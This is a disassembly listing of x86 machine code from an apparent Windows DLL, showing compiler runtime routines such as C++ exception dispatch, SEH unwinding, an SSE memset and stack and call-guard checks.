10002b12:	eb 20                	jmp    0x10002b34
10002b14:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
10002b1b:	eb 17                	jmp    0x10002b34
10002b1d:	83 ff fe             	cmp    $0xfffffffe,%edi
10002b20:	74 1e                	je     0x10002b40
10002b22:	68 04 30 01 10       	push   $0x10013004
10002b27:	56                   	push   %esi
10002b28:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
10002b2d:	8b cb                	mov    %ebx,%ecx
10002b2f:	e8 b8 05 00 00       	call   0x100030ec
10002b34:	56                   	push   %esi
10002b35:	ff 75 f8             	push   -0x8(%ebp)
10002b38:	e8 f3 fe ff ff       	call   0x10002a30
10002b3d:	83 c4 08             	add    $0x8,%esp
10002b40:	8b 45 f4             	mov    -0xc(%ebp),%eax
10002b43:	5f                   	pop    %edi
10002b44:	5e                   	pop    %esi
10002b45:	5b                   	pop    %ebx
10002b46:	8b e5                	mov    %ebp,%esp
10002b48:	5d                   	pop    %ebp
10002b49:	c3                   	ret
10002b4a:	8b 45 08             	mov    0x8(%ebp),%eax
10002b4d:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
10002b53:	75 38                	jne    0x10002b8d
10002b55:	83 3d 14 d2 00 10 00 	cmpl   $0x0,0x1000d214
10002b5c:	74 2f                	je     0x10002b8d
10002b5e:	68 14 d2 00 10       	push   $0x1000d214
10002b63:	e8 58 99 00 00       	call   0x1000c4c0
10002b68:	83 c4 04             	add    $0x4,%esp
10002b6b:	85 c0                	test   %eax,%eax
10002b6d:	74 1b                	je     0x10002b8a
10002b6f:	8b 35 14 d2 00 10    	mov    0x1000d214,%esi
10002b75:	8b ce                	mov    %esi,%ecx
10002b77:	6a 01                	push   $0x1
10002b79:	ff 75 08             	push   0x8(%ebp)
10002b7c:	ff 15 5c d1 00 10    	call   *0x1000d15c
10002b82:	ff d6                	call   *%esi
10002b84:	8b 75 f0             	mov    -0x10(%ebp),%esi
10002b87:	83 c4 08             	add    $0x8,%esp
10002b8a:	8b 45 08             	mov    0x8(%ebp),%eax
10002b8d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10002b90:	8b d0                	mov    %eax,%edx
10002b92:	e8 39 05 00 00       	call   0x100030d0
10002b97:	8b 45 0c             	mov    0xc(%ebp),%eax
10002b9a:	39 78 0c             	cmp    %edi,0xc(%eax)
10002b9d:	74 12                	je     0x10002bb1
10002b9f:	68 04 30 01 10       	push   $0x10013004
10002ba4:	56                   	push   %esi
10002ba5:	8b d7                	mov    %edi,%edx
10002ba7:	8b c8                	mov    %eax,%ecx
10002ba9:	e8 3e 05 00 00       	call   0x100030ec
10002bae:	8b 45 0c             	mov    0xc(%ebp),%eax
10002bb1:	56                   	push   %esi
10002bb2:	ff 75 f8             	push   -0x8(%ebp)
10002bb5:	89 58 0c             	mov    %ebx,0xc(%eax)
10002bb8:	e8 73 fe ff ff       	call   0x10002a30
10002bbd:	8b 4d ec             	mov    -0x14(%ebp),%ecx
10002bc0:	83 c4 08             	add    $0x8,%esp
10002bc3:	8b d6                	mov    %esi,%edx
10002bc5:	8b 49 08             	mov    0x8(%ecx),%ecx
10002bc8:	e8 e7 04 00 00       	call   0x100030b4
10002bcd:	cc                   	int3
10002bce:	55                   	push   %ebp
10002bcf:	8b ec                	mov    %esp,%ebp
10002bd1:	ff 75 08             	push   0x8(%ebp)
10002bd4:	ff 15 88 d0 00 10    	call   *0x1000d088
10002bda:	85 c0                	test   %eax,%eax
10002bdc:	74 11                	je     0x10002bef
10002bde:	56                   	push   %esi
10002bdf:	8b 30                	mov    (%eax),%esi
10002be1:	50                   	push   %eax
10002be2:	e8 cd 18 00 00       	call   0x100044b4
10002be7:	8b c6                	mov    %esi,%eax
10002be9:	59                   	pop    %ecx
10002bea:	85 f6                	test   %esi,%esi
10002bec:	75 f1                	jne    0x10002bdf
10002bee:	5e                   	pop    %esi
10002bef:	5d                   	pop    %ebp
10002bf0:	c3                   	ret
10002bf1:	e8 aa 06 00 00       	call   0x100032a0
10002bf6:	84 c0                	test   %al,%al
10002bf8:	75 03                	jne    0x10002bfd
10002bfa:	32 c0                	xor    %al,%al
10002bfc:	c3                   	ret
10002bfd:	e8 50 06 00 00       	call   0x10003252
10002c02:	84 c0                	test   %al,%al
10002c04:	75 07                	jne    0x10002c0d
10002c06:	e8 d1 06 00 00       	call   0x100032dc
10002c0b:	eb ed                	jmp    0x10002bfa
10002c0d:	b0 01                	mov    $0x1,%al
10002c0f:	c3                   	ret
10002c10:	e8 ab 05 00 00       	call   0x100031c0
10002c15:	85 c0                	test   %eax,%eax
10002c17:	0f 95 c0             	setne  %al
10002c1a:	c3                   	ret
10002c1b:	6a 00                	push   $0x0
10002c1d:	e8 5a 05 00 00       	call   0x1000317c
10002c22:	59                   	pop    %ecx
10002c23:	b0 01                	mov    $0x1,%al
10002c25:	c3                   	ret
10002c26:	55                   	push   %ebp
10002c27:	8b ec                	mov    %esp,%ebp
10002c29:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
10002c2d:	75 0a                	jne    0x10002c39
10002c2f:	e8 51 06 00 00       	call   0x10003285
10002c34:	e8 a3 06 00 00       	call   0x100032dc
10002c39:	b0 01                	mov    $0x1,%al
10002c3b:	5d                   	pop    %ebp
10002c3c:	c3                   	ret
10002c3d:	e8 43 06 00 00       	call   0x10003285
10002c42:	b0 01                	mov    $0x1,%al
10002c44:	c3                   	ret
10002c45:	6a 08                	push   $0x8
10002c47:	68 58 23 01 10       	push   $0x10012358
10002c4c:	e8 4f fa ff ff       	call   0x100026a0
10002c51:	8b 45 08             	mov    0x8(%ebp),%eax
10002c54:	85 c0                	test   %eax,%eax
10002c56:	74 7e                	je     0x10002cd6
10002c58:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
10002c5e:	75 76                	jne    0x10002cd6
10002c60:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
10002c64:	75 70                	jne    0x10002cd6
10002c66:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
10002c6d:	74 12                	je     0x10002c81
10002c6f:	81 78 14 21 05 93 19 	cmpl   $0x19930521,0x14(%eax)
10002c76:	74 09                	je     0x10002c81
10002c78:	81 78 14 22 05 93 19 	cmpl   $0x19930522,0x14(%eax)
10002c7f:	75 55                	jne    0x10002cd6
10002c81:	8b 48 1c             	mov    0x1c(%eax),%ecx
10002c84:	85 c9                	test   %ecx,%ecx
10002c86:	74 4e                	je     0x10002cd6
10002c88:	8b 51 04             	mov    0x4(%ecx),%edx
10002c8b:	85 d2                	test   %edx,%edx
10002c8d:	74 29                	je     0x10002cb8
10002c8f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10002c93:	52                   	push   %edx
10002c94:	ff 70 18             	push   0x18(%eax)
10002c97:	e8 4a 00 00 00       	call   0x10002ce6
10002c9c:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10002ca3:	eb 31                	jmp    0x10002cd6
10002ca5:	ff 75 0c             	push   0xc(%ebp)
10002ca8:	ff 75 ec             	push   -0x14(%ebp)
10002cab:	e8 43 00 00 00       	call   0x10002cf3
10002cb0:	59                   	pop    %ecx
10002cb1:	59                   	pop    %ecx
10002cb2:	c3                   	ret
10002cb3:	8b 65 e8             	mov    -0x18(%ebp),%esp
10002cb6:	eb e4                	jmp    0x10002c9c
10002cb8:	f6 01 10             	testb  $0x10,(%ecx)
10002cbb:	74 19                	je     0x10002cd6
10002cbd:	8b 40 18             	mov    0x18(%eax),%eax
10002cc0:	8b 08                	mov    (%eax),%ecx
10002cc2:	85 c9                	test   %ecx,%ecx
10002cc4:	74 10                	je     0x10002cd6
10002cc6:	8b 01                	mov    (%ecx),%eax
10002cc8:	51                   	push   %ecx
10002cc9:	8b 70 08             	mov    0x8(%eax),%esi
10002ccc:	8b ce                	mov    %esi,%ecx
10002cce:	ff 15 5c d1 00 10    	call   *0x1000d15c
10002cd4:	ff d6                	call   *%esi
10002cd6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10002cd9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10002ce0:	59                   	pop    %ecx
10002ce1:	5f                   	pop    %edi
10002ce2:	5e                   	pop    %esi
10002ce3:	5b                   	pop    %ebx
10002ce4:	c9                   	leave
10002ce5:	c3                   	ret
10002ce6:	55                   	push   %ebp
10002ce7:	8b ec                	mov    %esp,%ebp
10002ce9:	8b 4d 08             	mov    0x8(%ebp),%ecx
10002cec:	ff 55 0c             	call   *0xc(%ebp)
10002cef:	5d                   	pop    %ebp
10002cf0:	c2 08 00             	ret    $0x8
10002cf3:	55                   	push   %ebp
10002cf4:	8b ec                	mov    %esp,%ebp
10002cf6:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
10002cfa:	74 32                	je     0x10002d2e
10002cfc:	56                   	push   %esi
10002cfd:	57                   	push   %edi
10002cfe:	8b 7d 08             	mov    0x8(%ebp),%edi
10002d01:	8b 37                	mov    (%edi),%esi
10002d03:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
10002d09:	75 21                	jne    0x10002d2c
10002d0b:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
10002d0f:	75 1b                	jne    0x10002d2c
10002d11:	81 7e 14 20 05 93 19 	cmpl   $0x19930520,0x14(%esi)
10002d18:	74 18                	je     0x10002d32
10002d1a:	81 7e 14 21 05 93 19 	cmpl   $0x19930521,0x14(%esi)
10002d21:	74 0f                	je     0x10002d32
10002d23:	81 7e 14 22 05 93 19 	cmpl   $0x19930522,0x14(%esi)
10002d2a:	74 06                	je     0x10002d32
10002d2c:	5f                   	pop    %edi
10002d2d:	5e                   	pop    %esi
10002d2e:	33 c0                	xor    %eax,%eax
10002d30:	5d                   	pop    %ebp
10002d31:	c3                   	ret
10002d32:	e8 7b 04 00 00       	call   0x100031b2
10002d37:	89 70 10             	mov    %esi,0x10(%eax)
10002d3a:	8b 77 04             	mov    0x4(%edi),%esi
10002d3d:	e8 70 04 00 00       	call   0x100031b2
10002d42:	89 70 14             	mov    %esi,0x14(%eax)
10002d45:	e8 c7 24 00 00       	call   0x10005211
10002d4a:	cc                   	int3
10002d4b:	cc                   	int3
10002d4c:	cc                   	int3
10002d4d:	cc                   	int3
10002d4e:	cc                   	int3
10002d4f:	cc                   	int3
10002d50:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
10002d54:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
10002d59:	8b d7                	mov    %edi,%edx
10002d5b:	8b 7c 24 04          	mov    0x4(%esp),%edi
10002d5f:	85 c9                	test   %ecx,%ecx
10002d61:	0f 84 3c 01 00 00    	je     0x10002ea3
10002d67:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
10002d6d:	83 f9 20             	cmp    $0x20,%ecx
10002d70:	0f 86 df 00 00 00    	jbe    0x10002e55
10002d76:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
10002d7c:	0f 82 8b 00 00 00    	jb     0x10002e0d
10002d82:	0f ba 25 6c 40 01 10 	btl    $0x1,0x1001406c
10002d89:	01 
10002d8a:	73 09                	jae    0x10002d95
10002d8c:	f3 aa                	rep stos %al,%es:(%edi)
10002d8e:	8b 44 24 04          	mov    0x4(%esp),%eax
10002d92:	8b fa                	mov    %edx,%edi
10002d94:	c3                   	ret
10002d95:	0f ba 25 10 30 01 10 	btl    $0x1,0x10013010
10002d9c:	01 
10002d9d:	0f 83 b2 00 00 00    	jae    0x10002e55
10002da3:	66 0f 6e c0          	movd   %eax,%xmm0
10002da7:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
10002dac:	03 cf                	add    %edi,%ecx
10002dae:	0f 11 07             	movups %xmm0,(%edi)
10002db1:	83 c7 10             	add    $0x10,%edi
10002db4:	83 e7 f0             	and    $0xfffffff0,%edi
10002db7:	2b cf                	sub    %edi,%ecx
10002db9:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
10002dbf:	76 4c                	jbe    0x10002e0d
10002dc1:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
10002dc8:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
10002dcf:	90                   	nop
10002dd0:	66 0f 7f 07          	movdqa %xmm0,(%edi)
10002dd4:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
10002dd9:	66 0f 7f 47 20       	movdqa %xmm0,0x20(%edi)
10002dde:	66 0f 7f 47 30       	movdqa %xmm0,0x30(%edi)
10002de3:	66 0f 7f 47 40       	movdqa %xmm0,0x40(%edi)
10002de8:	66 0f 7f 47 50       	movdqa %xmm0,0x50(%edi)
10002ded:	66 0f 7f 47 60       	movdqa %xmm0,0x60(%edi)
10002df2:	66 0f 7f 47 70       	movdqa %xmm0,0x70(%edi)
10002df7:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
10002dfd:	81 e9 80 00 00 00    	sub    $0x80,%ecx
10002e03:	f7 c1 00 ff ff ff    	test   $0xffffff00,%ecx
10002e09:	75 c5                	jne    0x10002dd0
10002e0b:	eb 13                	jmp    0x10002e20
10002e0d:	0f ba 25 10 30 01 10 	btl    $0x1,0x10013010
10002e14:	01 
10002e15:	73 3e                	jae    0x10002e55
10002e17:	66 0f 6e c0          	movd   %eax,%xmm0
10002e1b:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
10002e20:	83 f9 20             	cmp    $0x20,%ecx
10002e23:	72 1c                	jb     0x10002e41
10002e25:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
10002e29:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
10002e2e:	83 c7 20             	add    $0x20,%edi
10002e31:	83 e9 20             	sub    $0x20,%ecx
10002e34:	83 f9 20             	cmp    $0x20,%ecx
10002e37:	73 ec                	jae    0x10002e25
10002e39:	f7 c1 1f 00 00 00    	test   $0x1f,%ecx
10002e3f:	74 62                	je     0x10002ea3
10002e41:	8d 7c 0f e0          	lea    -0x20(%edi,%ecx,1),%edi
10002e45:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
10002e49:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
10002e4e:	8b 44 24 04          	mov    0x4(%esp),%eax
10002e52:	8b fa                	mov    %edx,%edi
10002e54:	c3                   	ret
10002e55:	f7 c1 03 00 00 00    	test   $0x3,%ecx
10002e5b:	74 0e                	je     0x10002e6b
10002e5d:	88 07                	mov    %al,(%edi)
10002e5f:	47                   	inc    %edi
10002e60:	83 e9 01             	sub    $0x1,%ecx
10002e63:	f7 c1 03 00 00 00    	test   $0x3,%ecx
10002e69:	75 f2                	jne    0x10002e5d
10002e6b:	f7 c1 04 00 00 00    	test   $0x4,%ecx
10002e71:	74 08                	je     0x10002e7b
10002e73:	89 07                	mov    %eax,(%edi)
10002e75:	83 c7 04             	add    $0x4,%edi
10002e78:	83 e9 04             	sub    $0x4,%ecx
10002e7b:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
10002e81:	74 20                	je     0x10002ea3
10002e83:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
10002e8a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
10002e90:	89 07                	mov    %eax,(%edi)
10002e92:	89 47 04             	mov    %eax,0x4(%edi)
10002e95:	83 c7 08             	add    $0x8,%edi
10002e98:	83 e9 08             	sub    $0x8,%ecx
10002e9b:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
10002ea1:	75 ed                	jne    0x10002e90
10002ea3:	8b 44 24 04          	mov    0x4(%esp),%eax
10002ea7:	8b fa                	mov    %edx,%edi
10002ea9:	c3                   	ret
10002eaa:	55                   	push   %ebp
10002eab:	8b ec                	mov    %esp,%ebp
10002ead:	57                   	push   %edi
10002eae:	8b 7d 08             	mov    0x8(%ebp),%edi
10002eb1:	80 7f 04 00          	cmpb   $0x0,0x4(%edi)
10002eb5:	74 48                	je     0x10002eff
10002eb7:	8b 0f                	mov    (%edi),%ecx
10002eb9:	85 c9                	test   %ecx,%ecx
10002ebb:	74 42                	je     0x10002eff
10002ebd:	8d 51 01             	lea    0x1(%ecx),%edx
10002ec0:	8a 01                	mov    (%ecx),%al
10002ec2:	41                   	inc    %ecx
10002ec3:	84 c0                	test   %al,%al
10002ec5:	75 f9                	jne    0x10002ec0
10002ec7:	2b ca                	sub    %edx,%ecx
10002ec9:	53                   	push   %ebx
10002eca:	56                   	push   %esi
10002ecb:	8d 59 01             	lea    0x1(%ecx),%ebx
10002ece:	53                   	push   %ebx
10002ecf:	e8 fb 15 00 00       	call   0x100044cf
10002ed4:	8b f0                	mov    %eax,%esi
10002ed6:	59                   	pop    %ecx
10002ed7:	85 f6                	test   %esi,%esi
10002ed9:	74 19                	je     0x10002ef4
10002edb:	ff 37                	push   (%edi)
10002edd:	53                   	push   %ebx
10002ede:	56                   	push   %esi
10002edf:	e8 69 23 00 00       	call   0x1000524d
10002ee4:	8b 45 0c             	mov    0xc(%ebp),%eax
10002ee7:	8b ce                	mov    %esi,%ecx
10002ee9:	83 c4 0c             	add    $0xc,%esp
10002eec:	33 f6                	xor    %esi,%esi
10002eee:	89 08                	mov    %ecx,(%eax)
10002ef0:	c6 40 04 01          	movb   $0x1,0x4(%eax)
10002ef4:	56                   	push   %esi
10002ef5:	e8 ba 15 00 00       	call   0x100044b4
10002efa:	59                   	pop    %ecx
10002efb:	5e                   	pop    %esi
10002efc:	5b                   	pop    %ebx
10002efd:	eb 0b                	jmp    0x10002f0a
10002eff:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10002f02:	8b 07                	mov    (%edi),%eax
10002f04:	89 01                	mov    %eax,(%ecx)
10002f06:	c6 41 04 00          	movb   $0x0,0x4(%ecx)
10002f0a:	5f                   	pop    %edi
10002f0b:	5d                   	pop    %ebp
10002f0c:	c3                   	ret
10002f0d:	55                   	push   %ebp
10002f0e:	8b ec                	mov    %esp,%ebp
10002f10:	56                   	push   %esi
10002f11:	8b 75 08             	mov    0x8(%ebp),%esi
10002f14:	80 7e 04 00          	cmpb   $0x0,0x4(%esi)
10002f18:	74 08                	je     0x10002f22
10002f1a:	ff 36                	push   (%esi)
10002f1c:	e8 93 15 00 00       	call   0x100044b4
10002f21:	59                   	pop    %ecx
10002f22:	83 26 00             	andl   $0x0,(%esi)
10002f25:	c6 46 04 00          	movb   $0x0,0x4(%esi)
10002f29:	5e                   	pop    %esi
10002f2a:	5d                   	pop    %ebp
10002f2b:	c3                   	ret
10002f2c:	55                   	push   %ebp
10002f2d:	8b ec                	mov    %esp,%ebp
10002f2f:	83 ec 10             	sub    $0x10,%esp
10002f32:	8b 45 08             	mov    0x8(%ebp),%eax
10002f35:	53                   	push   %ebx
10002f36:	57                   	push   %edi
10002f37:	8b 7d 0c             	mov    0xc(%ebp),%edi
10002f3a:	bb 20 05 93 19       	mov    $0x19930520,%ebx
10002f3f:	89 45 f0             	mov    %eax,-0x10(%ebp)
10002f42:	85 ff                	test   %edi,%edi
10002f44:	74 2d                	je     0x10002f73
10002f46:	f6 07 10             	testb  $0x10,(%edi)
10002f49:	74 1e                	je     0x10002f69
10002f4b:	8b 08                	mov    (%eax),%ecx
10002f4d:	83 e9 04             	sub    $0x4,%ecx
10002f50:	56                   	push   %esi
10002f51:	51                   	push   %ecx
10002f52:	8b 01                	mov    (%ecx),%eax
10002f54:	8b 70 20             	mov    0x20(%eax),%esi
10002f57:	8b ce                	mov    %esi,%ecx
10002f59:	8b 78 18             	mov    0x18(%eax),%edi
10002f5c:	ff 15 5c d1 00 10    	call   *0x1000d15c
10002f62:	ff d6                	call   *%esi
10002f64:	5e                   	pop    %esi
10002f65:	85 ff                	test   %edi,%edi
10002f67:	74 0a                	je     0x10002f73
10002f69:	f6 07 08             	testb  $0x8,(%edi)
10002f6c:	74 05                	je     0x10002f73
10002f6e:	bb 00 40 99 01       	mov    $0x1994000,%ebx
10002f73:	8b 45 f0             	mov    -0x10(%ebp),%eax
10002f76:	89 45 f8             	mov    %eax,-0x8(%ebp)
10002f79:	8d 45 f4             	lea    -0xc(%ebp),%eax
10002f7c:	50                   	push   %eax
10002f7d:	6a 03                	push   $0x3
10002f7f:	6a 01                	push   $0x1
10002f81:	68 63 73 6d e0       	push   $0xe06d7363
10002f86:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10002f89:	89 7d fc             	mov    %edi,-0x4(%ebp)
10002f8c:	ff 15 8c d0 00 10    	call   *0x1000d08c
10002f92:	5f                   	pop    %edi
10002f93:	5b                   	pop    %ebx
10002f94:	c9                   	leave
10002f95:	c2 08 00             	ret    $0x8
10002f98:	cc                   	int3
10002f99:	cc                   	int3
10002f9a:	cc                   	int3
10002f9b:	cc                   	int3
10002f9c:	cc                   	int3
10002f9d:	cc                   	int3
10002f9e:	cc                   	int3
10002f9f:	cc                   	int3
10002fa0:	53                   	push   %ebx
10002fa1:	56                   	push   %esi
10002fa2:	57                   	push   %edi
10002fa3:	8b 54 24 10          	mov    0x10(%esp),%edx
10002fa7:	8b 44 24 14          	mov    0x14(%esp),%eax
10002fab:	8b 4c 24 18          	mov    0x18(%esp),%ecx
10002faf:	55                   	push   %ebp
10002fb0:	52                   	push   %edx
10002fb1:	50                   	push   %eax
10002fb2:	51                   	push   %ecx
10002fb3:	51                   	push   %ecx
10002fb4:	68 2d 30 00 10       	push   $0x1000302d
10002fb9:	67 64 ff 36 00 00    	push   %fs:0x0
10002fbf:	a1 04 30 01 10       	mov    0x10013004,%eax
10002fc4:	33 c4                	xor    %esp,%eax
10002fc6:	89 44 24 08          	mov    %eax,0x8(%esp)
10002fca:	67 64 89 26 00 00    	mov    %esp,%fs:0x0
10002fd0:	8b 44 24 30          	mov    0x30(%esp),%eax
10002fd4:	8b 58 08             	mov    0x8(%eax),%ebx
10002fd7:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
10002fdb:	33 19                	xor    (%ecx),%ebx
10002fdd:	8b 70 0c             	mov    0xc(%eax),%esi
10002fe0:	83 fe fe             	cmp    $0xfffffffe,%esi
10002fe3:	74 3b                	je     0x10003020
10002fe5:	8b 54 24 34          	mov    0x34(%esp),%edx
10002fe9:	83 fa fe             	cmp    $0xfffffffe,%edx
10002fec:	74 04                	je     0x10002ff2
10002fee:	3b f2                	cmp    %edx,%esi
10002ff0:	76 2e                	jbe    0x10003020
10002ff2:	8d 34 76             	lea    (%esi,%esi,2),%esi
10002ff5:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
10002ff9:	8b 0b                	mov    (%ebx),%ecx
10002ffb:	89 48 0c             	mov    %ecx,0xc(%eax)
10002ffe:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
10003002:	75 cc                	jne    0x10002fd0
10003004:	68 01 01 00 00       	push   $0x101
10003009:	8b 43 08             	mov    0x8(%ebx),%eax
1000300c:	e8 1b 04 00 00       	call   0x1000342c
10003011:	b9 01 00 00 00       	mov    $0x1,%ecx
10003016:	8b 43 08             	mov    0x8(%ebx),%eax
10003019:	e8 2d 04 00 00       	call   0x1000344b
1000301e:	eb b0                	jmp    0x10002fd0
10003020:	67 64 8f 06 00 00    	pop    %fs:0x0
10003026:	83 c4 18             	add    $0x18,%esp
10003029:	5f                   	pop    %edi
1000302a:	5e                   	pop    %esi
1000302b:	5b                   	pop    %ebx
1000302c:	c3                   	ret
1000302d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
10003031:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
10003038:	b8 01 00 00 00       	mov    $0x1,%eax
1000303d:	74 33                	je     0x10003072
1000303f:	8b 44 24 08          	mov    0x8(%esp),%eax
10003043:	8b 48 08             	mov    0x8(%eax),%ecx
10003046:	33 c8                	xor    %eax,%ecx
10003048:	e8 3c ec ff ff       	call   0x10001c89
1000304d:	55                   	push   %ebp
1000304e:	8b 68 18             	mov    0x18(%eax),%ebp
10003051:	ff 70 0c             	push   0xc(%eax)
10003054:	ff 70 10             	push   0x10(%eax)
10003057:	ff 70 14             	push   0x14(%eax)
1000305a:	e8 41 ff ff ff       	call   0x10002fa0
1000305f:	83 c4 0c             	add    $0xc,%esp
10003062:	5d                   	pop    %ebp
10003063:	8b 44 24 08          	mov    0x8(%esp),%eax
10003067:	8b 54 24 10          	mov    0x10(%esp),%edx
1000306b:	89 02                	mov    %eax,(%edx)
1000306d:	b8 03 00 00 00       	mov    $0x3,%eax
10003072:	c3                   	ret
10003073:	90                   	nop
10003074:	55                   	push   %ebp
10003075:	ff 74 24 08          	push   0x8(%esp)
10003079:	e8 b5 00 00 00       	call   0x10003133
1000307e:	83 c4 04             	add    $0x4,%esp
10003081:	8b 4c 24 08          	mov    0x8(%esp),%ecx
10003085:	8b 29                	mov    (%ecx),%ebp
10003087:	ff 71 1c             	push   0x1c(%ecx)
1000308a:	ff 71 18             	push   0x18(%ecx)
1000308d:	ff 71 28             	push   0x28(%ecx)
10003090:	e8 0b ff ff ff       	call   0x10002fa0
10003095:	83 c4 0c             	add    $0xc,%esp
10003098:	5d                   	pop    %ebp
10003099:	c2 04 00             	ret    $0x4
1000309c:	55                   	push   %ebp
1000309d:	56                   	push   %esi
1000309e:	57                   	push   %edi
1000309f:	53                   	push   %ebx
100030a0:	8b ea                	mov    %edx,%ebp
100030a2:	33 c0                	xor    %eax,%eax
100030a4:	33 db                	xor    %ebx,%ebx
100030a6:	33 d2                	xor    %edx,%edx
100030a8:	33 f6                	xor    %esi,%esi
100030aa:	33 ff                	xor    %edi,%edi
100030ac:	ff d1                	call   *%ecx
100030ae:	5b                   	pop    %ebx
100030af:	5f                   	pop    %edi
100030b0:	5e                   	pop    %esi
100030b1:	5d                   	pop    %ebp
100030b2:	c3                   	ret
100030b3:	90                   	nop
100030b4:	8b ea                	mov    %edx,%ebp
100030b6:	8b f1                	mov    %ecx,%esi
100030b8:	8b c1                	mov    %ecx,%eax
100030ba:	6a 01                	push   $0x1
100030bc:	e8 6b 03 00 00       	call   0x1000342c
100030c1:	33 c0                	xor    %eax,%eax
100030c3:	33 db                	xor    %ebx,%ebx
100030c5:	33 c9                	xor    %ecx,%ecx
100030c7:	33 d2                	xor    %edx,%edx
100030c9:	33 ff                	xor    %edi,%edi
100030cb:	ff e6                	jmp    *%esi
100030cd:	8d 49 00             	lea    0x0(%ecx),%ecx
100030d0:	55                   	push   %ebp
100030d1:	8b ec                	mov    %esp,%ebp
100030d3:	53                   	push   %ebx
100030d4:	56                   	push   %esi
100030d5:	57                   	push   %edi
100030d6:	6a 00                	push   $0x0
100030d8:	52                   	push   %edx
100030d9:	68 e5 30 00 10       	push   $0x100030e5
100030de:	51                   	push   %ecx
100030df:	ff 15 90 d0 00 10    	call   *0x1000d090
100030e5:	5f                   	pop    %edi
100030e6:	5e                   	pop    %esi
100030e7:	5b                   	pop    %ebx
100030e8:	5d                   	pop    %ebp
100030e9:	c3                   	ret
100030ea:	8b ff                	mov    %edi,%edi
100030ec:	55                   	push   %ebp
100030ed:	8b 6c 24 08          	mov    0x8(%esp),%ebp
100030f1:	52                   	push   %edx
100030f2:	51                   	push   %ecx
100030f3:	ff 74 24 14          	push   0x14(%esp)
100030f7:	e8 a4 fe ff ff       	call   0x10002fa0
100030fc:	83 c4 0c             	add    $0xc,%esp
100030ff:	5d                   	pop    %ebp
10003100:	c2 08 00             	ret    $0x8
10003103:	55                   	push   %ebp
10003104:	8b ec                	mov    %esp,%ebp
10003106:	a1 5c d1 00 10       	mov    0x1000d15c,%eax
1000310b:	3d f8 26 00 10       	cmp    $0x100026f8,%eax
10003110:	74 1f                	je     0x10003131
10003112:	64 8b 0d 18 00 00 00 	mov    %fs:0x18,%ecx
10003119:	8b 45 08             	mov    0x8(%ebp),%eax
1000311c:	8b 80 c4 00 00 00    	mov    0xc4(%eax),%eax
10003122:	3b 41 08             	cmp    0x8(%ecx),%eax
10003125:	72 05                	jb     0x1000312c
10003127:	3b 41 04             	cmp    0x4(%ecx),%eax
1000312a:	76 05                	jbe    0x10003131
1000312c:	6a 0d                	push   $0xd
1000312e:	59                   	pop    %ecx
1000312f:	cd 29                	int    $0x29
10003131:	5d                   	pop    %ebp
10003132:	c3                   	ret
10003133:	55                   	push   %ebp
10003134:	8b ec                	mov    %esp,%ebp
10003136:	a1 5c d1 00 10       	mov    0x1000d15c,%eax
1000313b:	3d f8 26 00 10       	cmp    $0x100026f8,%eax
10003140:	74 1c                	je     0x1000315e
10003142:	64 8b 0d 18 00 00 00 	mov    %fs:0x18,%ecx
10003149:	8b 45 08             	mov    0x8(%ebp),%eax
1000314c:	8b 40 10             	mov    0x10(%eax),%eax
1000314f:	3b 41 08             	cmp    0x8(%ecx),%eax
10003152:	72 05                	jb     0x10003159
10003154:	3b 41 04             	cmp    0x4(%ecx),%eax
10003157:	76 05                	jbe    0x1000315e
10003159:	6a 0d                	push   $0xd
1000315b:	59                   	pop    %ecx
1000315c:	cd 29                	int    $0x29
1000315e:	5d                   	pop    %ebp
1000315f:	c3                   	ret
10003160:	55                   	push   %ebp
10003161:	8b ec                	mov    %esp,%ebp
10003163:	8b 45 08             	mov    0x8(%ebp),%eax
10003166:	85 c0                	test   %eax,%eax
10003168:	74 0e                	je     0x10003178
1000316a:	3d b0 40 01 10       	cmp    $0x100140b0,%eax
1000316f:	74 07                	je     0x10003178
10003171:	50                   	push   %eax
10003172:	e8 3d 13 00 00       	call   0x100044b4
10003177:	59                   	pop    %ecx
10003178:	5d                   	pop    %ebp
10003179:	c2 04 00             	ret    $0x4
1000317c:	55                   	push   %ebp
1000317d:	8b ec                	mov    %esp,%ebp
1000317f:	a1 20 30 01 10       	mov    0x10013020,%eax
10003184:	83 f8 ff             	cmp    $0xffffffff,%eax
